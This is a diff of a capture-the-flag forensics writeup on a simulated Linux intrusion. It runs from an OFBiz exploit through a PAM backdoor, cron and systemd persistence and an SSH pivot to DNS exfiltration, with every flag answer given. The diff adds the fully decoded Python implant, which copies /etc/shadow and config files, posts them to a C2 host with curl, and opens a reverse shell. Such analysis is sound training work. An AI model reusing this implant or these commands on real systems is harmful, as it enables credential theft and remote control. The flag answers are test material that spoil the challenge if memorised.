@@ -1,8 +1,9 @@
+# CyberTek Writeup
+
 # Operation GhostVein — DFIR Writeup
 
-> ⚠️ **Spoiler Warning:** This writeup contains full solution details and flags for the Operation GhostVein / CyberTEK DFIR challenge.
-
 > A realistic Linux forensic investigation challenge focused on host artifacts, PCAP analysis, malware reversing, persistence, lateral movement, and DNS exfiltration.
+> 
 
 ---
 
@@ -20,12 +21,18 @@ The investigation was performed from a realistic evidence package containing:
 
 The goal was to reconstruct the full attack chain using host-based artifacts and network evidence.
 
+> 📸 **Screenshot — Evidence package structure**
+> 
+> 
+> *Add screenshot here.*
+> 
+
 ---
 
 ## 🧩 Attack Chain Summary
 
 | Stage | Activity | MITRE ATT&CK |
-|---|---|---|
+| --- | --- | --- |
 | Initial Access | Apache OFBiz exploitation | `T1190` |
 | Execution | Webshell and reverse shell | `T1059` |
 | Privilege Escalation | PAM backdoor | `T1556.003` |
@@ -37,31 +44,23 @@ The goal was to reconstruct the full attack chain using host-based artifacts and
 
 ## 1. Evidence Integrity
 
-> **Challenge question — Yoo**  
-> Welcome to Operation GhostVein.
->
-> Download the DFIR evidence handout:
-> `https://drive.google.com/file/d/1qJgTznQsHkGdYdmBSUG38QxmaHtQadZ2/view?usp=sharing`
->
-> Your first task is to verify the integrity of the archive and submit its SHA256 hash.
->
-> Flag format: `CyberTEK{sha256sum}`
-
 The first step was verifying the provided evidence archive.
 
 ```bash
 sha256sum GhostVein-IR-Collection.zip
 ```
 
+![image.png](screenshots/image.png)
+
 Result:
 
-```text
+```
 624ca5deb58c36080924c1e5bae7cbe3431d4cae5d6883700bf9081ef791737f
 ```
 
 Flag:
 
-```text
+```
 CyberTEK{624ca5deb58c36080924c1e5bae7cbe3431d4cae5d6883700bf9081ef791737f}
 ```
 
@@ -69,39 +68,36 @@ CyberTEK{624ca5deb58c36080924c1e5bae7cbe3431d4cae5d6883700bf9081ef791737f}
 
 ## 2. Initial Access — Apache OFBiz
 
-> **Challenge question — Zyyz 1**  
-> The first signs of compromise point toward the public-facing ERP/OFBiz server.
->
-> Identify the CVE that was exploited for initial access against the OFBiz server.
->
-> Flag format: `CyberTEK{CVE-YYYY-NNNNN}`
-
 The investigation started with the ERP/OFBiz server.
 
 Relevant evidence:
 
-```text
+```
 server1/opt/ofbiz/VERSION
 server1/opt/ofbiz/BUILD-INFO
 server1/var/log/ofbiz/ofbiz.log
 server1/var/log/apache2/access.log
 ```
 
+![Screenshot_26.png](screenshots/Screenshot_26.png)
+
 The server was running **Apache OFBiz 18.12.14**, and the logs showed activity targeting:
 
-```text
+```
 /webtools/control/ProgramExport
 ```
 
 This behavior matched exploitation of:
 
-```text
+```
 CVE-2024-38856
 ```
 
+![Screenshot_27.png](screenshots/Screenshot_27.png)
+
 Flag:
 
-```text
+```
 CyberTEK{CVE-2024-38856}
 ```
 
@@ -109,37 +105,35 @@ CyberTEK{CVE-2024-38856}
 
 ## 3. First Contact Timestamp
 
-> **Challenge question — Zyyz 2**  
-> The attacker touched the OFBiz server before the full compromise chain began.
->
-> Determine the timestamp of the attacker's first request to the OFBiz server.
->
-> Flag format: `CyberTEK{DD_Mon_YYYY:HH:MM:SS}`
-
 The first attacker request was found in the Apache access logs.
+
+![Screenshot_28.png](screenshots/Screenshot_28.png)
+
+The first relevant timestamp was:
+
+```
+02/May/2026:04:19:40
+```
 
 Flag:
 
-```text
-CyberTEK{02_May_2026:04:19:40}
+```
+CyberTEK{02/May/2026:04:19:40}
 ```
 
 ---
 
 ## 4. MITRE Initial Access
 
-> **Challenge question — Farfouch**  
-> Initial access was achieved through a vulnerable public-facing application.
->
-> Identify the MITRE ATT&CK technique ID that describes this initial access method.
->
-> Flag format: `CyberTEK{TXXXX}`
+The attacker exploited a public-facing application.
 
-The attack technique maps to **Exploit Public-Facing Application**.
+This maps to:
+
+![Screenshot_29.png](screenshots/Screenshot_29.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1190}
 ```
 
@@ -147,18 +141,19 @@ CyberTEK{T1190}
 
 ## 5. Webshell Discovery
 
-> **Challenge question — n0v4 lm4y3t**  
-> After gaining access, the attacker left behind a webshell on the OFBiz server.
->
-> Identify the filename of the webshell dropped by the attacker.
->
-> Flag format: `CyberTEK{file.extension}`
-
 A suspicious JSP file was discovered inside the OFBiz web application path.
+
+The discovered webshell was:
+
+```
+health.jsp
+```
+
+![Screenshot_30.png](screenshots/Screenshot_30.png)
 
 Flag:
 
-```text
+```
 CyberTEK{health.jsp}
 ```
 
@@ -166,18 +161,19 @@ CyberTEK{health.jsp}
 
 ## 6. Reverse Shell Timestamp
 
-> **Challenge question — Samyyy Jhinnn**  
-> The attacker triggered a reverse shell during the intrusion.
->
-> Determine the time at which the reverse shell was triggered.
->
-> Flag format: `CyberTEK{HH:MM}`
+The reverse shell callback was identified in the PCAP and correlated with host logs.
 
-The reverse shell callback was identified and correlated with the attack timeline.
+![Screenshot_30.png](screenshots/Screenshot_30.png)
+
+The reverse shell occurred during:
+
+```
+04:19
+```
 
 Flag:
 
-```text
+```
 CyberTEK{04:19}
 ```
 
@@ -185,18 +181,15 @@ CyberTEK{04:19}
 
 ## 7. MITRE Execution
 
-> **Challenge question — sno9yy**  
-> The attacker used command execution through scripting during the compromise.
->
-> Identify the MITRE ATT&CK technique ID that covers the scripting interpreter execution observed in this attack.
->
-> Flag format: `CyberTEK{TXXXX}`
+The attacker executed commands through a shell/webshell interface.
 
-The attacker executed commands through an interpreter/webshell path.
+This maps to:
+
+![Screenshot_31.png](screenshots/Screenshot_31.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1059}
 ```
 
@@ -204,18 +197,19 @@ CyberTEK{T1059}
 
 ## 8. Malware Binary Hash
 
-> **Challenge question — Zioudi 21/3**  
-> A suspicious binary was staged on the compromised server during the attack.
->
-> Identify the SHA256 hash of the malicious binary.
->
-> Flag format: `CyberTEK{sha256}`
+A suspicious binary named `monitor` was found on Server 1.
 
-A suspicious binary named `monitor` was found on the compromised server.
+Path:
+
+```
+server1/opt/.ghostvein/monitor
+```
+
+![Screenshot_33.png](screenshots/Screenshot_33.png)
 
 Flag:
 
-```text
+```
 CyberTEK{313cde2b5085e32f84d2167f3671c0f7234d0402251aa034d7da4e55d2fe412e}
 ```
 
@@ -223,18 +217,23 @@ CyberTEK{313cde2b5085e32f84d2167f3671c0f7234d0402251aa034d7da4e55d2fe412e}
 
 ## 9. PyInstaller Malware Analysis
 
-> **Challenge question — taw tweti bouzou**  
-> The staged binary appears to be a packaged Python payload.
->
-> Recover the original Python filename from the malicious PyInstaller binary.
->
-> Flag format: `CyberTEK{filename.py}`
+The `monitor` binary was identified as a PyInstaller-packed payload. To analyze the packed malware, I used `pyinstxtractor`, a tool designed to unpack PyInstaller executables and recover the embedded Python bytecode.
 
-The `monitor` binary was identified as a PyInstaller-packed payload.
+![Screenshot_35.png](screenshots/Screenshot_35.png)
+
+![Screenshot_32.png](screenshots/Screenshot_32.png)
+
+The recovered Python filename was:
+
+```
+implant.py
+```
+
+![Screenshot_34.png](screenshots/Screenshot_34.png)
 
 Flag:
 
-```text
+```
 CyberTEK{implant.py}
 ```
 
@@ -242,18 +241,149 @@ CyberTEK{implant.py}
 
 ## 10. C2 Configuration
 
-> **Challenge question — l5afe2**  
-> The implant contains a hardcoded command-and-control configuration.
->
-> Identify the C2 IP address and port embedded in the malicious implant.
->
-> Flag format: `CyberTEK{IP:PORT}`
+After extracting the PyInstaller archive, I used a Python bytecode decompiler to recover the embedded script.
 
-After extraction/decompilation, the implant revealed a hardcoded C2 endpoint.
+![Screenshot_36.png](screenshots/Screenshot_36.png)
+
+This produced a readable version of the malware, revealing an obfuscated Python payload:
+
+```python
+_ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+exec(_(b'...'))
+```
+
+#### Obfuscation Analysis
+
+The recovered script shows that the malware uses layered obfuscation based on:
+
+- String reversal
+- Base64 decoding
+- Zlib decompression
+
+The payload is wrapped inside:
+
+```python
+exec(_(b'...'))
+```
+
+This means the actual malicious code is hidden inside a compressed and encoded blob.
+
+#### Deobfuscation
+
+To recover the real script, the encoded payload must be decoded.
+
+There are two approaches:
+
+---
+
+### Manual (CyberChef)
+
+To recover the original script, I used CyberChef to iteratively decode the payload by applying the following steps multiple times:
+
+1. Reverse the byte string
+2. Apply Base64 Decode
+3. Apply Zlib Inflate
+
+![Screenshot_37.png](screenshots/Screenshot_37.png)
+
+![Screenshot_38.png](screenshots/Screenshot_38.png)
+
+The Original malicious script
+
+```python
+import socket
+import subprocess
+import os
+import base64
+import zipfile
+import time
+
+def _d(s):
+    rev = s[::-1]
+    pad = rev + '=' * (4 - len(rev) % 4)
+    return base64.b64decode(pad).decode()
+
+_a1 = _d("==wNz4CMx4CO2EjLykTM")
+_a2 = 4444
+_a3 = _d("==gcvRXau9WbvUGajF2Yu8CctR3L")
+_a4 = _d("=ESI5U2N0M1XwAjYtBkQ")
+
+_b1 = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/opt/deploy/ansible_inventory.ini",
+    "/opt/ofbiz/framework/entity/config/ofbiz-datasource.xml"
+]
+
+def _c1():
+    _e = "*/5 * * * * /opt/.ghostvein/monitor > /dev/null 2>&1"
+    os.system(f'(crontab -l 2>/dev/null; echo "{_e}") | crontab -')
+
+def _c2():
+    os.makedirs(_a3, exist_ok=True)
+    for _f in _b1:
+        if os.path.exists(_f):
+            os.system(f"cp {_f} {_a3}/")
+
+def _c3():
+    _z = f"{_a3}/archive.zip"
+    with zipfile.ZipFile(_z, 'w', zipfile.ZIP_DEFLATED) as _zf:
+        for _f in os.listdir(_a3):
+            _fp = os.path.join(_a3, _f)
+            if os.path.isfile(_fp) and _f != "archive.zip":
+                _zf.write(_fp, _f)
+    os.system(
+        f"curl -s -X POST http://{_a1}:9999/upload "
+        f"-F 'file=@{_z}' "
+        f"-H 'X-Auth: {_a4}'"
+    )
+
+def _c4():
+    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    _s.connect((_a1, _a2))
+    while True:
+        _c = _s.recv(1024).decode()
+        if _c.strip() == "exit":
+            break
+        _o = subprocess.getoutput(_c)
+        _s.send(_o.encode())
+    _s.close()
+
+if __name__ == "__main__":
+    _c1()
+    _c2()
+    _c3()
+    _c4()
+
+```
+
+---
+
+After decoding, the original malware logic is revealed, including a1:
+
+![Screenshot_39.png](screenshots/Screenshot_39.png)
+
+- C2 server:
+
+```
+192.168.10.37:4444
+```
+
+flag
+
+```
+CyberTEK{192.168.10.37:4444}
+```
+
+Decoded C2:
+
+```
+192.168.10.37:4444
+```
 
 Flag:
 
-```text
+```
 CyberTEK{192.168.10.37:4444}
 ```
 
@@ -261,18 +391,19 @@ CyberTEK{192.168.10.37:4444}
 
 ## 11. Exfiltration Password
 
-> **Challenge question — Jed Mojo Jojo**  
-> The implant authenticates its file exfiltration activity using a hardcoded secret.
->
-> Recover the password used by the implant for exfiltration authentication.
->
-> Flag format: `CyberTEK{password}`
+The implant also contained a hardcoded exfiltration authentication value.
 
-The implant contained a hardcoded authentication value used during exfiltration.
+![image.png](image%201.png)
+
+Decoded password:
+
+```
+B@mb00_S47e9!!
+```
 
 Flag:
 
-```text
+```
 CyberTEK{B@mb00_S47e9!!}
 ```
 
@@ -280,18 +411,41 @@ CyberTEK{B@mb00_S47e9!!}
 
 ## 12. Shellcode Encoder
 
-> **Challenge question — Seriooooooo**  
-> A shellcode blob was found alongside the implant.
->
-> Identify the Metasploit encoder used to obfuscate the shellcode.
->
-> Flag format: `CyberTEK{encoder_name}`
+A shellcode blob was found alongside the implant.
 
-A shellcode blob was found alongside the implant and identified as using the following encoder.
+![Screenshot_41.png](screenshots/Screenshot_41.png)
+
+Output:
+
+```
+00000000: beee 1142 48d9 ced9 7424 f458 29c9 b12d
+```
+
+This byte pattern is characteristic of a polymorphic decoder stub commonly found in Metasploit-encoded payloads.
+
+ Pattern Identification
+
+The presence of instructions such as:
+
+```
+d9 ce d9 74 24 f4
+```
+
+is a well-known signature of the Metasploit polymorphic encoder.
+
+To validate this hypothesis, I searched for:
+
+![Screenshot_40.png](screenshots/Screenshot_40.png)
+
+The results confirm that the most widely used encoder in Metasploit is:
+
+```
+x86/shikata_ga_nai
+```
 
 Flag:
 
-```text
+```
 CyberTEK{x86/shikata_ga_nai}
 ```
 
@@ -299,18 +453,29 @@ CyberTEK{x86/shikata_ga_nai}
 
 ## 13. PAM Privilege Escalation Clue
 
-> **Challenge question — Bady Idird**  
-> During post-exploitation reconnaissance, the attacker identified a suspicious PAM-related privilege escalation clue.
->
-> What suspicious PAM module was introduced during the privilege escalation stage?
->
-> Flag format: `CyberTEK{clue}`
-
 A suspicious PAM module was introduced during the privilege escalation stage.
+
+![Screenshot_42.png](screenshots/Screenshot_42.png)
+
+![Screenshot_43.png](screenshots/Screenshot_43.png)
+
+Relevant artifacts:
+
+```
+server1/opt/.ghostvein/pam_ghostvein.so
+server1/etc/pam.d/common-auth
+server1/var/log/auth.log
+```
+
+The suspicious module was:
+
+```
+pam_ghostvein.so
+```
 
 Flag:
 
-```text
+```
 CyberTEK{pam_ghostvein.so}
 ```
 
@@ -318,18 +483,13 @@ CyberTEK{pam_ghostvein.so}
 
 ## 14. Privilege Escalation CVE
 
-> **Challenge question — 1dh4M**  
-> The privilege escalation evidence points to a Linux-PAM related vulnerability path.
->
-> Identify the CVE associated with this privilege escalation path.
->
-> Flag format: `CyberTEK{CVE-YYYY-NNNN}`
+The evidence linked the PAM privilege escalation stage to:
 
-The evidence linked the PAM privilege escalation stage to the following CVE.
+![Screenshot_44.png](screenshots/Screenshot_44.png)
 
 Flag:
 
-```text
+```
 CyberTEK{CVE-2025-6020}
 ```
 
@@ -337,18 +497,15 @@ CyberTEK{CVE-2025-6020}
 
 ## 15. MITRE Privilege Escalation
 
-> **Challenge question — Blingos**  
-> The privilege escalation involved PAM modification/backdoor behavior.
->
-> Identify the MITRE ATT&CK sub-technique ID that covers the PAM backdoor technique used in this attack.
->
-> Flag format: `CyberTEK{TXXXX.XXX}`
-
 The attacker modified PAM authentication behavior.
+
+This maps to:
+
+![Screenshot_45.png](screenshots/Screenshot_45.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1556.003}
 ```
 
@@ -356,18 +513,19 @@ CyberTEK{T1556.003}
 
 ## 16. SSH Backdoor Key
 
-> **Challenge question — sbeveee**  
-> The attacker planted an SSH key to preserve privileged access on Server 1.
->
-> Identify the comment field of the attacker's backdoor SSH key.
->
-> Flag format: `CyberTEK{comment}`
+The attacker planted an SSH key for root access
 
-The attacker planted an SSH key for persistence.
+![Screenshot_46.png](screenshots/Screenshot_46.png)
+
+Suspicious key comment:
+
+```
+venomscript@c2.ghostvein.xyz
+```
 
 Flag:
 
-```text
+```
 CyberTEK{venomscript@c2.ghostvein.xyz}
 ```
 
@@ -375,18 +533,19 @@ CyberTEK{venomscript@c2.ghostvein.xyz}
 
 ## 17. Malicious Systemd Service
 
-> **Challenge question — No!dea**  
-> The attacker installed a malicious systemd service for persistence.
->
-> Identify the service name. Submit the name without the `.service` extension.
->
-> Flag format: `CyberTEK{service-name}`
-
 A malicious systemd service was installed for persistence.
+
+![Screenshot_47.png](screenshots/Screenshot_47.png)
+
+Service name:
+
+```
+ghostvein-sync
+```
 
 Flag:
 
-```text
+```
 CyberTEK{ghostvein-sync}
 ```
 
@@ -394,18 +553,25 @@ CyberTEK{ghostvein-sync}
 
 ## 18. Cron Persistence
 
-> **Challenge question — Zyyz 3**  
-> The attacker created a scheduled task to keep the malicious implant running.
->
-> Identify the full cron schedule of the attacker's planted cron job on Server 1.
->
-> Flag format: `CyberTEK{schedule_with_underscores}`
-
 The attacker created a cron job to keep the implant running.
+
+![Screenshot_48.png](screenshots/Screenshot_48.png)
+
+Cron schedule:
+
+```
+*/5 * * * *
+```
+
+Flag format converted spaces to underscores:
+
+```
+CyberTEK{*/5_*_*_*_*}
+```
 
 Flag:
 
-```text
+```
 CyberTEK{*/5_*_*_*_*}
 ```
 
@@ -413,18 +579,13 @@ CyberTEK{*/5_*_*_*_*}
 
 ## 19. MITRE Persistence
 
-> **Challenge question — 3afwi**  
-> The persistence mechanism included a cron-based scheduled task.
->
-> Identify the MITRE ATT&CK sub-technique ID for cron-based persistence.
->
-> Flag format: `CyberTEK{TXXXX.XXX}`
+Persistence through cron maps to:
 
-Persistence through cron maps to the following MITRE ATT&CK sub-technique.
+![Screenshot_49.png](screenshots/Screenshot_49.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1053.003}
 ```
 
@@ -432,18 +593,13 @@ CyberTEK{T1053.003}
 
 ## 20. Shadow Hash Cracking
 
-> **Challenge question — 9oub3aaaaa**  
-> The attacker accessed local credential material during the compromise.
->
-> Recover the plaintext password for the ofbiz user.
->
-> Flag format: `CyberTEK{plaintext_password}`
+The attacker accessed credential material, and the investigation included `/etc/passwd` and `/etc/shadow`.
 
-The attacker accessed local credential material, including `/etc/passwd` and `/etc/shadow`.
+![Screenshot_51.png](screenshots/Screenshot_51.png)
 
 Flag:
 
-```text
+```
 CyberTEK{manchestercity}
 ```
 
@@ -451,18 +607,13 @@ CyberTEK{manchestercity}
 
 ## 21. Pivot Credentials
 
-> **Challenge question — Seraph**  
-> The attacker found credentials on Server 1 that enabled lateral movement.
->
-> Identify the file containing the lateral movement credentials and the username used.
->
-> Flag format: `CyberTEK{filename_username}`
-
 The attacker found credentials for lateral movement in an Ansible inventory file.
+
+![Screenshot_50.png](screenshots/Screenshot_50.png)
 
 Flag:
 
-```text
+```
 CyberTEK{ansible_inventory.ini_dbadmin}
 ```
 
@@ -470,18 +621,19 @@ CyberTEK{ansible_inventory.ini_dbadmin}
 
 ## 22. Pivot Destination
 
-> **Challenge question — Inferno**  
-> The attacker used the discovered credentials to move laterally to the database server.
->
-> Identify the destination IP and SSH port used for lateral movement.
->
-> Flag format: `CyberTEK{IP:PORT}`
-
 The lateral movement destination was found in host evidence and PCAP traffic.
+
+![Screenshot_55.png](screenshots/Screenshot_55.png)
+
+Pivot destination:
+
+```
+10.10.5.35:2222
+```
 
 Flag:
 
-```text
+```
 CyberTEK{10.10.5.35:2222}
 ```
 
@@ -489,18 +641,15 @@ CyberTEK{10.10.5.35:2222}
 
 ## 23. MITRE Lateral Movement
 
-> **Challenge question — Hadedi**  
-> The attacker used SSH to move laterally from the compromised ERP server to the database server.
->
-> Identify the MITRE ATT&CK sub-technique ID that covers SSH-based lateral movement.
->
-> Flag format: `CyberTEK{TXXXX.XXX}`
-
 The attacker moved laterally using SSH.
+
+This maps to:
+
+![Screenshot_52.png](screenshots/Screenshot_52.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1021.004}
 ```
 
@@ -508,18 +657,19 @@ CyberTEK{T1021.004}
 
 ## 24. Database Targeted
 
-> **Challenge question — Aymen Dahmen**  
-> After reaching the database server, the attacker interacted with PostgreSQL data.
->
-> Identify the name of the PostgreSQL database targeted and dumped by the attacker.
->
-> Flag format: `CyberTEK{database_name}`
-
 After reaching Server 2, the attacker interacted with PostgreSQL.
+
+![Screenshot_53.png](screenshots/Screenshot_53.png)
+
+Targeted database:
+
+```
+patients_prod
+```
 
 Flag:
 
-```text
+```
 CyberTEK{patients_prod}
 ```
 
@@ -527,18 +677,19 @@ CyberTEK{patients_prod}
 
 ## 25. DNS Tunnel Domain
 
-> **Challenge question — fer9et 3ami**  
-> The attacker used DNS-style traffic to exfiltrate data from the database server.
->
-> Identify the domain suffix used for the DNS tunneling activity.
->
-> Flag format: `CyberTEK{domain.tld}`
-
 DNS-style traffic was used for exfiltration.
+
+![Screenshot_54.png](screenshots/Screenshot_54.png)
+
+Domain suffix:
+
+```
+ghostvein.xyz
+```
 
 Flag:
 
-```text
+```
 CyberTEK{ghostvein.xyz}
 ```
 
@@ -546,18 +697,21 @@ CyberTEK{ghostvein.xyz}
 
 ## 26. DNS Exfiltration Decoding
 
-> **Challenge question — El Bambo**  
-> The DNS tunneling activity contains encoded data.
->
-> Reconstruct the data hidden in the DNS queries and recover the full PostgreSQL connection string.
->
-> Flag format: `CyberTEK{connection_string}`
+The DNS query labels contained hex-encoded data.
 
-The DNS query labels contained encoded data that reconstructed the PostgreSQL connection string.
+![Screenshot_56.png](screenshots/Screenshot_56.png)
+
+![Screenshot_57.png](screenshots/Screenshot_57.png)
+
+Decoded data:
+
+```
+postgresql://dbadmin:GhostDB#Adm1n2026@10.10.5.35:5432/patients_prod
+```
 
 Flag:
 
-```text
+```
 CyberTEK{postgresql://dbadmin:GhostDB#Adm1n2026@10.10.5.35:5432/patients_prod}
 ```
 
@@ -565,18 +719,15 @@ CyberTEK{postgresql://dbadmin:GhostDB#Adm1n2026@10.10.5.35:5432/patients_prod}
 
 ## 27. MITRE Exfiltration
 
-> **Challenge question — Kakarot**  
-> The attacker used DNS-based network activity to move data out of the environment.
->
-> Identify the MITRE ATT&CK technique ID that covers DNS-based data exfiltration.
->
-> Flag format: `CyberTEK{TXXXX.XXX}`
-
 The attacker exfiltrated data over DNS.
+
+This maps to:
+
+![Screenshot_58.png](screenshots/Screenshot_58.png)
 
 Flag:
 
-```text
+```
 CyberTEK{T1048.003}
 ```
 
@@ -584,23 +735,78 @@ CyberTEK{T1048.003}
 
 ## 28. Full ATT&CK Chain
 
-> **Challenge question — البامبو الساحق**  
-> You have reconstructed the full Operation GhostVein intrusion chain.
->
-> Provide the MITRE ATT&CK technique IDs in order for: Initial Access, Execution, Privilege Escalation via PAM backdoor, Persistence via Cron, Lateral Movement via SSH, and Exfiltration over DNS.
->
-> Flag format: `CyberTEK{TXXXX_TXXXX_TXXXX.XXX_TXXXX.XXX_TXXXX.XXX_TXXXX.XXX}`
-
 The full chain reconstructed from evidence was:
 
-Flag:
+```
+Initial Access  -> T1190
+Execution       -> T1059
+Privilege Esc   -> T1556.003
+Persistence     -> T1053.003
+Lateral Move    -> T1021.004
+Exfiltration    -> T1048.003
+```
 
-```text
+Final flag:
+
+```
 CyberTEK{T1190_T1059_T1556.003_T1053.003_T1021.004_T1048.003}
 ```
 
 ---
 
-## Author
+## Lessons Learned
+
+This investigation highlights the importance of correlating multiple evidence sources:
+
+- Web logs revealed the initial access vector.
+- Filesystem artifacts exposed webshells, malware, persistence, and PAM tampering.
+- PCAP analysis confirmed reverse shell traffic, SSH pivoting, and DNS tunneling.
+- Malware reversing recovered C2 configuration and exfiltration secrets.
+- Credential artifacts enabled lateral movement reconstruction.
+- MITRE ATT&CK mapping helped structure the full intrusion chain.
+
+---
+
+## Conclusion
+
+Operation GhostVein demonstrates a realistic DFIR workflow where the investigator must pivot between host artifacts and network evidence.
+
+The challenge required:
+
+- Linux artifact triage
+- Log analysis
+- PCAP analysis
+- Malware reverse engineering
+- Credential analysis
+- Hash cracking
+- MITRE ATT&CK mapping
+
+This type of scenario reflects how real incident response investigations require correlation across different evidence sources rather than relying on a single log or tool output.
+
+---
+
+## Final Attack Chain
+
+```
+[1] Initial Access      - Apache OFBiz exploitation
+[2] Execution           - Webshell and reverse shell
+[3] Malware Staging     - PyInstaller implant and shellcode
+[4] Privilege Escalation- PAM backdoor simulation
+[5] Persistence         - SSH key, systemd service, cron job
+[6] Credential Access   - passwd/shadow and Ansible inventory
+[7] Lateral Movement    - SSH to database server
+[8] Collection          - PostgreSQL database access
+[9] Exfiltration        - DNS tunneling
+```
+
+---
+
+## 👤 Author
 
 **Re4perZ3d**
+
+Cybersecurity Student | SOC Analyst | CTF Player
+
+```
+Happy Hunting 🕵️‍♂️
+```
